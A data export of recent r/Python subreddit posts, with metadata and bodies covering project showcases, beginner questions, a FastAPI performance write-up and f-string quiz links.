1m4ofoe,Is type hints as valuable / expected in py as typescript?,MilanTheNoob,79,76,2025-07-20 13:05:16,https://www.reddit.com/r/Python/comments/1m4ofoe/is_type_hints_as_valuable_expected_in_py_as/,"Whether you're working by yourself or in a team, to what extent is it commonplace and/or expected to use type hints in functions?"
1m4o31x,How AI is Sharpening My Python Skills: Beyond Basic Code Generation for Real Problems,hero88645,0,8,2025-07-20 12:47:38,https://www.reddit.com/r/Python/comments/1m4o31x/how_ai_is_sharpening_my_python_skills_beyond/,"Hey r/Python community,

As an AI student and an aspiring developer, I've been heavily leaning into Python for my projects. Like many, I've had my fair share of frustrating debugging sessions and endless attempts to optimize messy code.

I've started using specific prompt engineering techniques with large language models (LLMs) not just to generate boilerplate, but to genuinely assist with complex Python tasks. For example, I recently struggled with optimizing a nested loop in a data processing script. Instead of just asking for a ""better loop,"" I provided the AI with:

1. The full code block.
2. My performance goal (e.g., ""reduce execution time by 50%"").
3. Constraints (e.g., ""no external libraries beyond standard ones"").
4. My current thought process on why it was slow.

The AI, acting as an ""optimizer,"" gave me incredibly precise refactoring suggestions, including using `collections.Counter` and list comprehensions more effectively, along with detailed explanations of *why* its suggestions improved performance. It was a game-changer for my workflow.

**I'm curious: How are you advanced Python users or students integrating AI into your workflow beyond basic code generation?** Are you using it for debugging, complex refactoring, or understanding obscure library behaviors? What prompt strategies have you found most effective?

Let's share tips on how to truly leverage AI as a Python co-pilot!"
1m4nul8,KvDeveloper Client ‚Äì Expo Go for Kivy on Android,novfensec,10,0,2025-07-20 12:35:32,https://www.reddit.com/r/Python/comments/1m4nul8/kvdeveloper_client_expo_go_for_kivy_on_android/,"[KvDeveloper Client](https://github.com/Novfensec/KvDeveloper-Client)

[Live Demonstration](https://youtu.be/-VTCTNmHB94)

Instantly load your app on mobile via QR code or Server URL. Experience blazing-fast Kivy app previews on Android with KvDeveloper Client, It‚Äôs the Expo Go for Python devs‚Äîhot reload without the hassle.

# What My Project Does

KvDeveloper Client is a **mobile companion app that enables instant, hot-reloading previews of your Kivy (Python) apps directly on Android devices‚Äîno USB cable or apk builds required**. By simply starting a development server from your Kivy project folder, you can scan a QR code or input the server‚Äôs URL on your phone to instantly load your app with real-time, automatic updates as you edit Python or KV files. This workflow mirrors the speed and seamlessness of Expo Go for React Native, but designed specifically for Python and the Kivy framework.

**Key Features:**

* Instantly preview Kivy apps on Android without manual builds or installation steps.
* Real-time updates on file change (Python, KV language).
* Simple connection via QR code or direct server URL.
* Secure local-only sync by default, with opt-in controls.

# Target Audience

This project is ideal for:

* **Kivy developers** seeking faster iteration cycles and more efficient UI/logic debugging on real devices.
* Python enthusiasts interested in mobile development without the overhead of traditional Android build processes.
* Educators and students who want a hands-on, low-friction way to experiment with Kivy on mobile.

# Comparison

|KvDeveloper Client|Traditional Kivy Dev Workflow|Expo Go (React Native)|
|:-|:-|:-|
|Instant app preview on Android|Build APK, install on device|Instant app preview|
|QR code/server URL connection|USB cable/manual install|QR code/server connection|
|Hot-reload (kvlang, Python, or any allowed extension files)|Full build to test code changes|Hot-reload (JavaScript)|
|No system-wide installs needed|Requires Kivy setup on device|No system-wide installs|
|Designed for Python/Kivy|Python/Kivy|JavaScript/React Native|

If you want to **supercharge your Kivy app development cycle and experience frictionless hot-reload on Android**, KvDeveloper Client is an essential tool to add to your workflow."
1m4bawg,Detect LLM hallucinations using state-of-the-art uncertainty quantification techniques with UQLM,Opposite_Answer_287,28,4,2025-07-20 00:21:21,https://www.reddit.com/r/Python/comments/1m4bawg/detect_llm_hallucinations_using_stateoftheart/,"# What My Project Does
UQLM (uncertainty quantification for language models) is an open source Python package for generation time, zero-resource hallucination detection. It leverages state-of-the-art uncertainty quantification (UQ) techniques from the academic literature to compute response-level confidence scores based on response consistency (in multiple responses to the same prompt), token probabilities, LLM-as-a-Judge, or ensembles of these. 

# Target Audience
Developers of LLM system/applications looking for generation-time hallucination detection without requiring access to ground truth texts.

# Comparison
Numerous UQ techniques have been proposed in the literature, but their adoption in user-friendly, comprehensive toolkits remains limited. UQLM aims to bridge this gap and democratize state-of-the-art UQ techniques. By integrating generation and UQ-scoring processes with a user-friendly API,  UQLM makes these methods accessible to non-specialized practitioners with minimal engineering effort.

Check it out, share feedback, and contribute if you are interested!

Link: https://github.com/cvs-health/uqlm

"
1m4avkf,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,8,11,2025-07-20 00:00:31,https://www.reddit.com/r/Python/comments/1m4avkf/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1m4ahyj,Function Coaster: A pygame based graphing game,ComplexCollege6382,13,3,2025-07-19 23:42:33,https://www.reddit.com/r/Python/comments/1m4ahyj/function_coaster_a_pygame_based_graphing_game/,"Hey everyone!  
I made a small game in Python using `pygame` where you can enter math functions like `x**2` or `sin(x)`, and a ball will physically roll along the graph like a rollercoaster. It doesn't really have a target audience, it's just for fun.

Short demo GIF: [https://imgur.com/a/Lh967ip](https://imgur.com/a/Lh967ip)

GitHub: [github.com/Tbence132545/Function-Coaster](https://github.com/Tbence132545/Function-Coaster)

You can:

* Type in multiple functions (even with intervals like `x**2 [0, 5], or compositions`)
* Watch a ball react to slopes and gravity
* Set a finish point and try to ""ride the function"" to win

There is already a similar game called SineRider, I was just curious to see if I could build something resembling it using my current knowledge from scratch.

It‚Äôs far from perfect ‚Äî but I‚Äôd love feedback or ideas if you have any. (I plan on expanding this idea in the near future)  
Thanks for checking it out!"
1m46zf1,What are some libraries i should learn to use?,Optimal-Cod2023,126,81,2025-07-19 21:03:02,https://www.reddit.com/r/Python/comments/1m46zf1/what_are_some_libraries_i_should_learn_to_use/,"I am new to python and rn im learning syntax i will mostly be making pygame games or automation tools that for example ""click there"" wait 3 seconds ""click there"" etc what librariea do i need to learn?"
1m45ekc,PyCharm IDE problems,Ok-Software8390,20,12,2025-07-19 19:55:02,https://www.reddit.com/r/Python/comments/1m45ekc/pycharm_ide_problems/,"For the last few months, Pycharm just somehow bottlenecks after few hours of coding and running programms. First, it gives my worning that IDE memory is running low, than it just becomes so slow you can't use it anymore. I solve this problem by closing it and open it again to ""clean"" memory.

Anbody else has that problem? How to solve it?

I am thinking about going to VS Code beacuse of that:).."
1m43rsx,[News] Artificial Intelligence Media Festival Accepting Python-Powered Creative Submissions,Future-Airport1732,0,0,2025-07-19 18:46:59,https://www.reddit.com/r/Python/comments/1m43rsx/news_artificial_intelligence_media_festival/,"The **Artificial Intelligence Media Festival (AIMF)** is now accepting submissions for 2025 ‚Äî and they're looking for innovative projects powered by **Python** at the intersection of art and artificial intelligence.

üé¨ AIMF celebrates the evolving relationship between creativity and code ‚Äî from generative art and storytelling to interactive AI media. If you've been working on tools, projects, or experiments using Python-based libraries, this is your moment.

# üß† What They're Looking For:

* Projects using **Transformers**, **LLMs**, or **Diffusers** for generative storytelling or visuals
* Interactive media or AI-enhanced short films powered by **Flask**, **Streamlit**, or **PyTorch**
* Python-based creative tools that blend narrative, sound, or visuals
* Experiments that challenge traditional filmmaking or artistic creation using AI

# üèÜ Why It Matters:

This is one of the few festivals inviting **developers, researchers, and artists** to submit work not just as coders ‚Äî but as **creators.** It‚Äôs an opportunity to showcase how Python is driving the next wave of storytelling innovation.

üìÖ **Submission Deadline:** \[July 27th 2025\]  
üåê **Submit or Learn More:** \[AIMF.digital\]

If you're using Python to push the boundaries of media, **AIMF wants to see your work**. Feel free to share what you're building in the comments!

\#Python #AI #GenerativeArt #OpenAI #MachineLearning #AIMF2025 #LLM #Diffusers #CreativeCoding"
1m3zo6n,Making Abstract Function without ABC. Is this right approach ? what am i lagging?,FishermanResident349,0,9,2025-07-19 15:56:58,https://www.reddit.com/r/Python/comments/1m3zo6n/making_abstract_function_without_abc_is_this/,"    class CAR:
    ¬† ¬† def __init__(self, car_model):
    ¬† ¬† ¬† ¬† self.car_model = car_model
    
    # MADE ABSTRACT FUNCTION (METHOD)
    ¬† ¬† def Car_Model(self):
    ¬† ¬† ¬† ¬† pass
    
    # MADE METHODS LIKE CONCRETE FUNCTIONS IN ABC
    ¬† ¬† def KeyOn(self):
    ¬† ¬† ¬† ¬† return f""{self.car_model} : STARTS...""
    
    ¬† ¬† def Car_Acclerate(self):
    ¬† ¬† ¬† ¬† return f""{self.car_model} : ACCELERATE""
    
    ¬† ¬† def Car_Break(self):
    ¬† ¬† ¬† ¬† return f""{self.car_model} : APPLIES BRAKE..""
    
    ¬† ¬† def keyOFF(self):
    ¬† ¬† ¬† ¬† return f""{self.car_model} : STOPS...""
    
    
    class Toyota(CAR):
    ¬† ¬† def Car_Model(self):
    ¬† ¬† ¬† ¬† return f""Car Model : {self.car_model}""
    
    ¬† ¬† def KeyOn(self):
    ¬† ¬† ¬† ¬† return super().KeyOn()
    
    ¬† ¬† def Car_Acclerate(self):
    ¬† ¬† ¬† ¬† return super().Car_Acclerate()
    
    ¬† ¬† def Car_Break(self):
    ¬† ¬† ¬† ¬† return super().Car_Break()
    
    ¬† ¬† def keyOFF(self):
    ¬† ¬† ¬† ¬† return super().keyOFF()
    
    
    fortuner = Toyota(""Fortuner"")
    print(fortuner.Car_Model())
    print(fortuner.KeyOn())
    print(fortuner.Car_Acclerate())
    print(fortuner.Car_Break())
    print(fortuner.keyOFF())
    
    
    "
1m3yo65,"Web x Desktop Python Lib with Routing, Theming, Components, LifecycleHooks made with Pyside6 FastAPI",step-czxn,0,3,2025-07-19 15:14:55,https://www.reddit.com/r/Python/comments/1m3yo65/web_x_desktop_python_lib_with_routing_theming/,"üîó **GitHub Repo**: [WinUp](https://github.com/mebaadwaheed/winup)

# What My Project Does

**WinUp** is a modern, component-based GUI framework for Python built on PySide6 with:

* A real **reactive state system** (`state.create`, `bind_to`)
*  **Live Hot Reload** (LHR) ‚Äì instantly updates your UI as you save
*  **Built-in theming** (light/dark/custom)
* Native-feeling **UI components**
* **Built-in animation** support
* Optional **PySide6/Qt integration** for advanced use
* **Web support via FastAPI + Uvicorn** ‚Äì run the same GUI in the browser
* No QML, no XML, no subclassing Qt widgets ‚Äî just clean Python code

# Target Audience

* üßë‚Äçüíª Python developers building **desktop tools or internal apps**
* üöÄ Indie hackers, tinkerers, and beginners
* üò§ Anyone tired of **Tkinter‚Äôs ancient look** or **Qt‚Äôs verbosity**
* üåç Developers looking to **deploy desktop & web from one codebase**

# Comparison with Other Frameworks

|Feature|**WinUp**|Tkinter|PySide6 / PyQt6|Toga|DearPyGui|
|:-|:-|:-|:-|:-|:-|
|**Syntax**|Declarative|Imperative|Verbose|Declarative|Verbose|
|**Animations**|Built-in|No|Manual|No|Built-in|
|**Theming**|Built-in|No|QSS|Basic|Custom|
|**State System**|Built-in|Manual|Signal-based|Limited|Built-in|
|**Live Hot Reload**|‚úÖ Yes|‚ùå No|‚ùå No|‚úÖ Yes|‚ùå No|
|**Web Support**|‚úÖ Yes (FastAPI)|‚ùå No|‚ùå No|‚ö†Ô∏è Experimental|‚ùå No|
|**Learning Curve**|Easy|Easy|Steep|Medium|Medium|

# Example: State Binding with Events

    import winup
    from winup import ui
    
    @winup.component
    def App():
        counter = winup.state.create(""counter"", 0)
        label = ui.Label()
        counter.bind_to(label, 'text', lambda c: f""Counter Value: {c}"")
    
        def increment():
            counter.set(counter.get() + 1)
    
        return ui.Column(children=[
            label,
            ui.Button(""Increment"", on_click=increment)
        ])
    
    if __name__ == ""__main__"":
        winup.run(main_component_path=""new_state_demo:App"", title=""New State Demo"")
    

# Install

    pip install winup

# Built-in Features

* ‚úÖ Reactive **state system** with binding
* ‚úÖ **Live Hot Reload** (LHR)
* ‚úÖ **Theming engine** (light/dark/custom)
* ‚úÖ **Declarative UI**
* ‚úÖ Basic **animation support**
* ‚úÖ Native **PySide6/Qt fallback access**
* ‚úÖ **FastAPI + Uvicorn** integration for **web deployment**

# Contribute or Star ‚≠ê

WinUp is **active and open-source**. Contributions, ideas, bug reports, and PRs are always welcome.

üîó **GitHub**: [WinUp](https://github.com/mebaadwaheed/winup)"
1m3wk5e,What‚Äôs one Python package you discovered recently that instantly made your life easier?,Dazzling-Shallot-400,0,5,2025-07-19 13:42:53,https://www.reddit.com/r/Python/comments/1m3wk5e/whats_one_python_package_you_discovered_recently/,Always on the lookout for underrated gems could be something small like `rich` for pretty printing or a niche tool that saved you hours. Drop your favs üëá
1m3ufpz,"Show /r/Python: My self-hosted, open-source Telegram front-end for the Gemini API",Low_Bee8502,2,3,2025-07-19 11:56:52,https://www.reddit.com/r/Python/comments/1m3ufpz/show_rpython_my_selfhosted_opensource_telegram/,"Hi everyone,

I've been using Google's Gemini API a lot lately but was hesitant to use public Telegram bots that require you to share your personal API key. I wanted a private, secure, and feature-rich way to interact with the model, so I decided to build my own solution.

Today, I'm excited to share the result: **MyGemini**. It's a fully open-source, asynchronous Telegram bot that you can host yourself.

**GitHub Repo:** [https://github.com/kobaltgit/MyGemini](https://github.com/kobaltgit/MyGemini)

[*Here's a quick GIF showing the multi-dialog feature*](https://i.ibb.co/XfgK8m43/My-Gemini-01.gif)

# What My Project Does

MyGemini acts as a personal, secure gateway to the Google Gemini API. It allows you to use your own API key, ensuring privacy and full control over usage costs. Key features include:

* **Multi-Dialog Context:** Create and switch between isolated conversations to keep topics separate.
* **Custom Personas:** Change the bot's expertise on the fly (e.g., from a general assistant to a Python Expert or a Historian).
* **Full Admin Panel:** A powerful `/admin` command to view global stats, manage users, and broadcast messages.
* **Image & Voice Processing:** The bot can analyze images and transcribe voice messages.
* **Google Search Integration:** Fetches real-time information for up-to-date answers.

# Target Audience

This project is aimed at **Python developers and tech enthusiasts** who want a powerful, self-hosted AI assistant without relying on third-party services. It's designed to be a production-ready application, not just a toy project. It's also a great learning resource for anyone interested in modern Python practices like `asyncio`, API integration, and building complex Telegram bots.

# Comparison

Compared to existing public Gemini bots on Telegram, MyGemini offers three main advantages:

1. **Privacy & Security:** You use your **own** API key, which is encrypted locally. Public bots require you to trust a third party with your key, which can be a security risk.
2. **No Rate Limits or Fees (from the bot):** You are only limited by your own Google API quota. There are no extra fees, subscriptions, or message limits imposed by the bot itself.
3. **Full Control & Customization:** Since you host it yourself, you can modify any part of it. You can add new personas, change the system prompts, or integrate it with other services.

# For the Python enthusiasts here, this is what's under the hood:

The project is built with Python 3.10+ and leverages modern async practices. I focused on creating a clean and scalable architecture.

* **Async Core:** Built entirely on `asyncio` with `pyTelegramBotAPI` (async version) and `aiohttp`.
* **Configuration:** Uses `.env` for secrets and a `logging.yaml` file for a detailed, multi-file logging setup.
* **Database:** A simple `sqlite3` database managed by a dedicated async manager.
* **Security:** User API keys are encrypted using the `cryptography` library.
* **Message Handling:** A `MarkdownTextSplitter` from `LangChain` safely chunks long messages, and `telegramify-markdown` ensures correct MarkdownV2 escaping.

I built this as a practical project to dive deeper into `asyncio` and API integration, and it's now become my daily driver for interacting with Gemini.

The project is licensed under MIT, so feel free to use it, fork it, and build upon it.

I would love to get some feedback from the community! Feel free to check out the repo, and if you find it useful, a star on GitHub would be amazing. Thanks for checking it out!"
1m3txd3,Suggest Projects,Own_Hyena_3605,0,2,2025-07-19 11:28:10,https://www.reddit.com/r/Python/comments/1m3txd3/suggest_projects/,"Kindly suggest the projects which gives weightage to the resume and helps to switch the career. And, also suggest the free resources to learn them."
1m3tmro,Test your knowledge of f-strings,1st1,305,23,2025-07-19 11:10:59,https://www.reddit.com/r/Python/comments/1m3tmro/test_your_knowledge_of_fstrings/,"If you enjoyed [jsdate.wtf](http://jsdate.wtf) you'll love [fstrings.wtf](http://fstrings.wtf) 

And most likely discover a thing or two that Python can do and you had no idea. "
1m3t5dv,My journey to scale a Python service to handle dozens of thousands rps,Odd-Solution-2551,176,67,2025-07-19 10:41:30,https://www.reddit.com/r/Python/comments/1m3t5dv/my_journey_to_scale_a_python_service_to_handle/,"Hello!

I recently wrote this [medium](https://medium.com/p/db4548813e3a). I‚Äôm ***not*** looking for clicks, just wanted to share a quick and informal summary here in case it helps anyone working with **Python**, **FastAPI**, or scaling async services.

# Context

Before I joined the team, they developed a Python service using fastAPI to serve recommendations thru it. The setup was rather simple, ScyllaDB and DynamoDB as data storages and some external APIs for other data sources. However, the service could not scale beyond 1% traffic and it was already rather slow (e.g, I recall **p99 was somewhere 100-200ms**).

When I just started, my manager asked me to take a look at it, so here it goes.

# Async vs sync

I quickly noticed all path operations were defined as **async**, while all I/O operations were **sync** (i.e blocking the event loop). FastAPI [docs](https://fastapi.tiangolo.com/async/) do a great job explaining when or not using asyn path operations, and I'm surprised how many times this page is overlooked (not the first time I see this error), and to me that is the most important part in fastAPI. Anyway, I updates all I/O calls to be non-blocking either offloading them to a thread pool or using an asyncio compatible library (eg, aiohttp and aioboto3). As of now, all I/O calls are async compatible, for Scylla we use [scyllapy](https://github.com/Intreecom/scyllapy), and unofficial driver wrapped around the offical rust based driver, for DynamoDB we use yet another non-official library [aioboto3](https://pypi.org/project/aioboto3/) and [aiohttp](https://docs.aiohttp.org/en/stable/) for calling other services.   These updates resulted in a¬†**latency reduction of over 40%**¬†and a¬†**more than 50% increase in throughput**.

# It is not only about making the calls async

By this point, all I/O operations had been converted to non-blocking calls, but still I could clearly see the event loop getting block quite frequently.

# Avoid fan-outs

Fanning out dozens of calls to ScyllaDB per request killed our event loop. Batching them massively improved latency by 50%. Try to avoid fanning outs queries as much as possible, the more you fan out, the more likely the event loop gets block in one of those fan-outs and make you whole request slower.

# Saying Goodbye to Pydantic

Pydantic and fastAPI go hand-by-hand, but you need to be careful to not overuse it, again another error I've seen multiple times. Pydantic takes place in three distinct stages: request input parameters, request output, and object creation. While this approach ensures robust data integrity, it can introduce inefficiencies. For instance, if an object is created and then returned, it will be validated multiple times: once during instantiation and again during response serialization. I removed Pydantic everywhere expect on the input request, and use dataclasses with slots, resulting in¬†**a latency reduction by more than 30%**.

Think about if you need data validation in all your steps, and try to minimize it. Also, keep you Pydantic models simple, and do not branch them out, for example, consider a response model defined as a Union\[A, B\]. In this case, FastAPI (via Pydantic) will validate first against model A, and if it fails against model B. If A and B are deeply nested or complex, this leads to redundant and expensive validation, which can negatively impact performance.

# Tune GC settings

After these optimisations, with some extra monitoring I could see a bimodal distribution of latency in the request, i.e most of the request would take somewhere around 5-10ms while there were a signification fraction of them took somewhere 60-70ms. This was rather puzzling because apart from the content itself, in shape and size there were not significant differences. It all pointed down the problem was on some recurrent operations running in the background, the garbage collector.

We tuned the GC thresholds, and we saw a **20% overall latency** reduction in our service. More notably, the latency for homepage recommendation requests, which return the most data, improved dramatically, with **p99 latency dropping** from **52ms to 12ms**.

# Conclusions and learnings

* **Debugging and reasoning in a concurrent world under the reign of the GIL is not easy**. You might have optimized 99% of your request, but a rare operation, happening just 1% of the time, can still become a bottleneck that drags down overall performance.
* **No free lunch**. FastAPI and Python enable rapid development and prototyping, but at scale, it‚Äôs crucial to understand what‚Äôs happening under the hood.
* **Start small, test, and extend**. I can‚Äôt stress enough how important it is to start with a PoC, evaluate it, address the problems, and move forward. Down the line, it is very difficult to debug a fully featured service that has scalability problems.

With all these optimisations, the service is handling all the traffic and a **p99 of of less than 10ms**. 

I hope I did a good summary of the post, and obviously there are more details on the post itself, so feel free to check it out or ask questions here. I hope this helps other engineers!"
1m3syfv,Announcing AutStr 1.0: Infinite Structures as First-Class Python Citizens,Broad_Piano6754,1,0,2025-07-19 10:29:15,https://www.reddit.com/r/Python/comments/1m3syfv/announcing_autstr_10_infinite_structures_as/,"I'm excited to release AutStr, a Python library for symbolic manipulation of infinite mathematical structures using automata theory.

# What My Project Does

Inspired by automatic structures research, AutStr enables:

üî¢ **Infinite Arithmetic**

* Native algebraic interface for B√ºchi integer arithmetic
* Solve linear equations over ‚Ñ§ with base-2 encoding
* Symbolic implementation of algorithms like Sieve of Eratosthenes

ü§ñ **Automatic Presentations**

* Represent infinite domains/relations via finite automata
* Evaluate FO(‚àû) queries (""there exist infinitely many x"")
* Dynamically update relations during evaluation
* Serialize compiled results for reuse

‚ö°Ô∏è **Sparse Automata Backend**

* JAX-accelerated automata operations
* Space-efficient representation via default transitions
* Integrated visualization capabilities

&#8203;

    from autstr.arithmetic import x, y
    R = (x + y == 10)  # Infinite solution set
    print(R.is_finite())  # False
    print((5, 5) in R)   # True

GitHub: [https://github.com/fariedabuzaid/AutStr](https://github.com/fariedabuzaid/AutStr)  
Install: `pip install autstr`

# Target Audience 

Perfect for researchers and anyone exploring computable infinite structures!

# Comparison 

|Feature|AutStr|SymPy/Z3|
|:-|:-|:-|
|**Domain**|Infinite structures|Finite/closed-form math|
|**Representation**|Automata-based|Symbolic expressions|
|**Quantifiers**|Native ‚àû-quantifiers|‚àÄ/‚àÉ with limitations|
|**Solutions**|Entire solution sets|Single solutions|
|**Specialty**|Decidable infinite models|General math/SAT|

**When to use AutStr:**

* For **infinite domains** (‚Ñ§, ‚Ñö, trees)
* When you need **complete solution sets**
* For **FO(‚àû) queries**
* **Not for**: Logic fragment where highly optimized solvers exist

SymPy/Z3 excel at symbolic algebra/SAT, while AutStr handles automata-representable infinities via first-order logic with specialized quantifiers. They complement rather than replace each other."
1m3pca6,cA2A: A command-line utility for interacting with A2A agents.,RussellLuo,2,0,2025-07-19 06:32:37,https://www.reddit.com/r/Python/comments/1m3pca6/ca2a_a_commandline_utility_for_interacting_with/,"# What My Project Does

[cA2A](https://github.com/RussellLuo/ca2a) is a little toy command-line utility that helps you interact with [A2A](https://a2a-protocol.org/) agents.

It's basically `curl` for A2A agents.

# Target Audience

Anyone who wants to debug or interact with A2A agents.

# Installation

    pip install ca2a

# Quick Start

Run an A2A agent (see [Helloworld Example](https://github.com/a2aproject/a2a-python#helloworld-example)):

    git clone https://github.com/a2aproject/a2a-samples.git
    cd a2a-samples/samples/python/agents/helloworld
    uv run .

Send a message to the agent:

    ca2a http://localhost:9999 message/send message:='{
      ""role"": ""user"",
      ""parts"": [{""kind"": ""text"", ""text"": ""Hello""}],
      ""messageId"": ""msg_123"",
      ""taskId"": ""task_123""
    }'

Send a streaming message to the agent:

    ca2a http://localhost:9999 message/stream message:='{
      ""role"": ""user"",
      ""parts"": [{""kind"": ""text"", ""text"": ""Hello""}],
      ""messageId"": ""msg_123"",
      ""taskId"": ""task_123""
    }'"
1m3o8q5,Streamline ‚Äòrealtime‚Äô dashboard,DesperateMilkMan9292,2,0,2025-07-19 05:26:15,https://www.reddit.com/r/Python/comments/1m3o8q5/streamline_realtime_dashboard/,"Hey all,
Has anyone built a ‚Äúrealtime‚Äù dashboard in Streamlit for monitoring robot telemetry? I‚Äôm using DDS/ROS pub-sub to stream ~10Hz data (speed, RPM, fuel, etc.) and plot with Plotly. Despite using threaded subscribers, deques, and managing state to reduce redraws, Streamlit only updates at ~1Hz with visible flicker. I'm wondering if this is a Streamlit limitation due to rerunning scripts on update, or just my setup. The goal is a simple Python-based viewer to verify data integrity‚Äîno hard real-time control needed. 
Anyone have working examples of higher-performance Streamlit dashboards or know its limits with faster data? open to suggestions on alternatives.
Thanks"
1m3lgss,Hello everyone....,pthnmaster,0,10,2025-07-19 02:53:33,https://www.reddit.com/r/Python/comments/1m3lgss/hello_everyone/,"Hello everyone, I am 17 years old, I am studying my last year of high school, at first I was thinking of going into accounting, but I like programming more so I am thinking of going into Data Sciences, I am starting to program in python, I follow the udemy course taught by Federico Garay, at times, it seems a little challenging, I am only seeing polymorphisms in the object-oriented programming part, any recommendations? "
1m3l6hf,My first experience with Python,Stock-Percentage4021,28,45,2025-07-19 02:38:35,https://www.reddit.com/r/Python/comments/1m3l6hf/my_first_experience_with_python/,"Okay I won‚Äôt go into much detail, but I‚Äôm a non-coder type. I am very technical-just don‚Äôt like coding basics mostly because of how my brain works. But I will say after spending 3-4 weeks in Python Hell trying to get things working; I will say this. Everyone who can get Python to sing has my utmost respect. I have never thought coding or programming was overly easy, BUT I now understand why coders and programmers want to throw computers across the room. It was one of the most frustrating and weird experiences of my life. So to the people who work in the Python/CSS area of coding. I tip my hat to you. Keep up the good work."
1m3l5y1,Type annotated parser combinator package with dataclass integration (Parmancer),hornetbee,5,0,2025-07-19 02:37:49,https://www.reddit.com/r/Python/comments/1m3l5y1/type_annotated_parser_combinator_package_with/,"I'd like to showcase **Parmancer**, a parser combinator library with thorough type annotations and a concise dataclass integration.

* GitHub:¬†[https://github.com/parmancer/parmancer](https://github.com/parmancer/parmancer)
* Documentation:¬†[https://parmancer.com](https://parmancer.com/)

**What My Project Does**

Parmancer is for parsing text into structured data types, by creating small parsers and combining them into larger parsers. The main features are:

* A typical range of parsers and combinators suitable for most string parsing tasks.
* Thorough **type annotations**: Every parser has a return type, and all of the combinator functions keep track of the return types as parsers are combined. This includes modifying return types by mapping results through functions. It also includes type errors when incompatible parsers are combined. This lets type checkers like mypy/pyright catch errors before runtime.
* **Dataclass parsers**: Parse text directly into a dataclass instance with with minimal boilerplate and no need for post-processing lists/tuples of strings into more structured data types - see the example below.

Here's a quick example of the dataclass parser approach. Parsers are defined for each field of the dataclass, then they are applied to the input text in sequence. The result is an instance of the dataclass, meaning there's no boilerplate between defining the parser and having structured, type annotated data:

    from dataclasses import dataclass
    from parmancer import regex, string, take, gather
    
    example_text = """"""Readings (2:01 PM)
    300.1, 301, 300""""""
    
    # Before .map, the type is Parser[str]
    # After .map, the type is Parser[float]
    numeric = regex(r""\d+(\.\d+)?"").map(float)
    
    @dataclass
    class Reading:
        timestamp: str = take(regex(r""Readings \(([^)]+)\)"", group=1) << string(""\n""))
        values: list[float] = take(numeric.sep_by(string("", "")))
    
    parser = gather(Reading) # The type of this is Parser[Reading]
    
    result = parser.parse(example_text)
    assert result == Reading(timestamp=""2:01 PM"", values=[300.1, 301, 300])

Note that dataclass parsers can be used inside other dataclass parsers, so you can create hierarchical data structures for storing more complex data, see examples in the repo if you're interested.

**Target Audience**

Anyone who needs to parse text into structured data types, where that text doesn't follow a standard format like CSV/JSON/etc. Anyone interested in:

* Type safety during development for all parsers, combinators, and the results of running a parser.
* Maintainable/modular parser code all in Python (write small unit-testable parsers then combine them into larger parsers which can handle more text & more variations of text)
* IDE support with autocomplete and type checking

**Comparison**

This project was inspired by [parsy](https://github.com/python-parsy/parsy) (and the fork [typed-parsy](https://github.com/python-parsy/typed-parsy)) which is also a Python-only parser combinator. Some other popular parsing libraries include Parsec, Pyparsing and Lark. These other packages don't have complete type annotations for their result types (or their result type is always the same, like a list of token strings).

Parmancer's main difference with these libraries is that it includes thorough type annotations for parsers, combinators and results. Parmancer parsers and combinators were deliberately written in a way which suits the Python type system. For example, the sequence parser's return type is a tuple instead of a list (as in parsy) which means each result's type, along with the number of elements in the result, is maintained by the tuple type: tuple\[str, int, str\] as opposed to list\[str | int\].  
  
Another novel feature is the dataclass integration, which cuts out a lot of boilerplate if your aim is to extract structured data from text.

Being pure Python with no optimizations, it runs as fast as similar Python-only packages like parsy, but not as fast as Lark and other packages which include some compilation or optimization step.

**Current Status**

All of the features are ready and usable, so please give it a try if you are interested. The API is not stable yet, but I'd like to make it stable if there is interest and after some time passes for the dust to settle."
1m3i04u,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,3,0,2025-07-19 00:00:45,https://www.reddit.com/r/Python/comments/1m3i04u/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1m3hei1,[Quiz] How well do you know f-strings? (made by Armin Ronacher),murlakatamenka,282,45,2025-07-18 23:33:10,https://www.reddit.com/r/Python/comments/1m3hei1/quiz_how_well_do_you_know_fstrings_made_by_armin/,"~~20~~ ~~22~~ 26 questions to check how well you can understand f-strings:

https://fstrings.wtf

> An interactive quiz website that tests your knowledge of Python f-string edge cases and advanced features.

> This quiz explores the surprising, confusing, and powerful aspects of Python f-strings through 20 carefully crafted questions. While f-strings seem simple on the surface, they have many hidden features and edge cases that can trip up even experienced Python developers.

> Remember: f-strings are powerful, but with great power comes great responsibility... and occasionally great confusion!

Source repo: https://github.com/mitsuhiko/fstrings-wtf

P.S. I got 10/20 on my first try."
